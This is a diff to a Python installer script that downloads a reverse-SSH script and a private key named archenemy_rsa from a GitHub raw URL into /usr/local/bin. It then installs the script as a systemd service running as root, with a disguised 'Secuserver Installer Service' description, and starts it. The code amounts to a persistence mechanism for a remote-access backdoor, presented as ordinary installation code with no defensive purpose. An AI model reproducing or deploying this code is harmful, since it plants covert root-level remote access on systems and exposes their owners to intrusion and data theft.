@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import os
+import sys
 import requests
 import subprocess
 
@@ -12,12 +13,12 @@ contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads
 
 
 # Define the output file paths
+envPath = "/usr/local/bin/protectionEnv"
+pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
 repoFilePath = "/usr/local/bin/reverse_ssh_android2.py"
 requirementsFilePath = "/usr/local/bin/requirements.txt"
 contentFilePath = "/usr/local/bin/archenemy_rsa"
 serviceFilePath = "/etc/systemd/system/reverse_ssh.service"
-
-
 
 # Function to download a file and save it locally
 def download_file(url, file_path):
@@ -30,15 +31,35 @@ def download_file(url, file_path):
     except requests.exceptions.RequestException as e:
         print(f"Failed to download {file_path}. Error: {e}")
 
-# Function to create a systemd service file
-def create_service_file():
-    service_content = f"""[Unit]
-Description=Installer Service
+# Function to create a virtual environment and install requirements
+def setup_python_environment(env_path, requirements_path):
+    try:
+        # Create the virtual environment
+        subprocess.run([sys.executable, '-m', 'venv', env_path], check=True)
+        print(f"Virtual environment created at {env_path}")
+
+        # Install requirements
+        pip_executable = os.path.join(env_path, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(env_path, 'bin', 'pip')
+        subprocess.run([pip_executable, 'install', '-r', requirements_path], check=True)
+        print("Requirements installed successfully.")
+        
+        return pip_executable  # Return pip path for service configuration if needed
+
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to set up environment or install requirements. Error: {e}")
+        return None
+
+# Function to create a systemd service file (Linux only)
+def create_service_file(service_file_path, python_path):
+    service_content = f"""
+[Unit]
+Description=Secuserver Installer Service
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/python3 {repoFilePath}
+ExecStart={python_path} /usr/local/bin/reverse_ssh_android2.py
 WorkingDirectory=/usr/local/bin
+Environment=PATH={os.path.dirname(python_path)}:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 StandardOutput=journal
 StandardError=journal
 Restart=on-failure
@@ -48,19 +69,12 @@ User=root
 WantedBy=multi-user.target
 """
     try:
-        with open(serviceFilePath, 'w') as f:
+        with open(service_file_path, 'w') as f:
             f.write(service_content)
-        print(f"Service file created at {serviceFilePath}.")
+        print(f"Service file created at {service_file_path}.")
     except Exception as e:
         print(f"Failed to create service file. Error: {e}")
 
-# Function to install requirements
-def install_requirements(file_path):
-    try:
-        subprocess.run(['pip3', 'install', '-r', file_path], check=True)
-        print("Requirements installed successfully.")
-    except subprocess.CalledProcessError as e:
-        print(f"Failed to install requirements. Error: {e}")
 
 # Function to make script executable
 def make_executable(file_path):
@@ -81,11 +95,13 @@ if __name__ == "__main__":
     # Make the main script executable
     make_executable(repoFilePath)
 
-    # Install requirements
-    #install_requirements(requirementsFilePath)
+    # Create the environment and install requirements
+    pip_path = setup_python_environment(envPath, requirementsFilePath)
 
-    # Create the systemd service file
-    create_service_file()
+    # Create the service file if on Linux
+    if pip_path and os.name != 'nt':  # Skip service creation on Windows
+        python_executable = os.path.join(envPath, 'bin', 'python3')
+        create_service_file(serviceFilePath, pythonPath)
 
     # Reload systemd to recognize the new service
     subprocess.run(['systemctl', 'daemon-reload'], check=True)
@@ -95,4 +111,3 @@ if __name__ == "__main__":
 
     # Start the service immediately
     subprocess.run(['systemctl', 'start', 'reverse_ssh.service'], check=True)
-
